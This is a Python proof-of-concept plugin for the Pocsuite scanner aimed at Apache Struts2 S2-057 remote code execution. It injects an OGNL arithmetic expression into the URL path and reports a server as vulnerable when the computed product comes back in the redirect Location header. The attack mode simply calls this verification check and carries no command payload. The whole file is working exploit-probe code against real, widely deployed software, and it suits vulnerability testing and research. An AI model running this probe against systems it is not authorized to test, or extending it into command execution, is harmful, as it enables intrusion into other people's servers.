#!/usr/bin/python
# -*- coding: utf-8 -*-

import string
import time
import random
from pocsuite.api.request import req #用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.utils import randomStr


class TestPOC(POCBase):
    name = 'Struts2 S2-057 Remote Code Execution'
    vulID = '4'  # https://www.seebug.org/vuldb/ssvid-93077
    author = ['liujun']
    vulType = 'cmd-exec'
    version = '1.0'    # default version: 1.0
    references = ['https://github.com/vulhub/vulhub/tree/master/struts2/s2-057']
    desc = '''Struts2 S2-057 Remote Code Execution'''

    vulDate = '2018-08-23'
    createDate = '2019-03-26'
    updateDate = '2019-03-26'

    appName = 'Struts2'
    appVersion = '2.3.x'
    appPowerLink = 'https://struts.apache.org/'
    samples = ['']


    def _attack(self):
        """attack mode"""
        return self._verify()

    def _verify(self):
        """verify mode"""
        result = {}
        random1 = random.randint(999,9999)
        random2 = random.randint(999,9999)
        random3 = random1 * random2
        spliturl = self.url.split('/')
        targetUrl = spliturl[-1]
        targetUrl  = '${{{0}*{1}}}'.format(random1,random2) + "/" + targetUrl
        finalUrl = "http://"
        for i in range(1,len(spliturl)-1):
            if spliturl[i] != '':
                finalUrl = finalUrl + spliturl[i] + "/"

        finalUrl = finalUrl + targetUrl

        #print finalUrl

        matchstring = str(random3)
        #print random3
        try:
            resp = req.get(finalUrl,allow_redirects=False)
        #print resp.headers

            if matchstring in resp.headers['location'].lower():
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
